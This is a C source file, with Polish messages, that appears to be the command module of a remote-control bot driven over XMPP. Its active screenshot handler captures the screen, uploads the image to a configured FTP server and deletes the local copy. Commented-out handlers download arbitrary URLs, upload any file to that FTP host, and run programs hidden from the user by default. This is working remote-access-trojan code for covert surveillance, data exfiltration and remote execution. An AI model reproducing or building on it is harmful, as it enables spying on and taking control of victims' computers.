#include "common.h"
#include "config.h"
#include "helpers.h"

void CmdDoScreenshot(Command * command, Response * response)
{
    //Xmpp_SendMessage(cmd->conn, cmd->jid, "Trwa wysyłanie zrzutu ekranu na serwer...");
    TCHAR path[MAX_PATH];
    saveSS(path, MAX_PATH);
    TCHAR *file = basename(path);

    int code = FtpSendFile(FTP_HOST, FTP_DIR_SS, path, file, FTP_USER, FTP_PASS, 0);

    TCHAR url[512];

    if (code == 0)
    {
        DeleteFile(path);
        strcpy(url, FTP_URL_SS);
        strcat(url, file);

        //sendResponse(command->rid, 0, url);
    }
}
/*
void CmdDownloadFile(Command *cmd, int argc, TCHAR *argv[])
{
    if (argc < 3)
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Musisz podać adres do pliku oraz ścieżkę do zapisu.");
        return;
    }

    Xmpp_SendMessage(cmd->conn, cmd->jid, "Rozpoczęto pobieranie pliku.");

    int code = URLDownloadToFile(argv[1], argv[2]);

    if (code == 0)
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Pobieranie zakończone.");
    }
    else
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Wystąpił błąd podczas pobierania.");
    }
}

void CmdUploadFile(Command *cmd, int argc, TCHAR *argv[])
{
    if (argc < 2)
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Musisz podać ścieżkę do pliku.");
        return;
    }

    Xmpp_SendMessage(cmd->conn, cmd->jid, "Rozpoczęto wysyłanie pliku.");

    TCHAR *file = basename(argv[1]);


    int code = FtpSendFile(FTP_HOST, FTP_DIR_UPLOAD, argv[1], file, FTP_USER, FTP_PASS, FALSE);

    if (code == 0)
    {
        TCHAR url[512];
        strcpy(url, FTP_URL_UPLOAD);
        strcat(url, file);

        Xmpp_SendMessage(cmd->conn, cmd->jid, url);
    }
    else
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Wystąpił błąd podczas wysyłania.");
    }
}

void CmdRun(Command *cmd, int argc, TCHAR *argv[])
{
    if (argc < 2)
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Musisz podać ścieżkę do pliku.");
        return;
    }

    UINT uCmdShow = SW_HIDE;

    if (argc > 2)
    {
        if (strcmp("normal", argv[2]) == 0)
        {
            uCmdShow = SW_SHOWNORMAL;
        }
    }

    int code = WinExec(argv[1], uCmdShow);
    if (code > 31)
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Aplikacja została uruchomiona.");
    }
    else
    {
        Xmpp_SendMessage(cmd->conn, cmd->jid, "Wystąpił błąd podczas wykonywania aplikacji.");
    }
}
*/
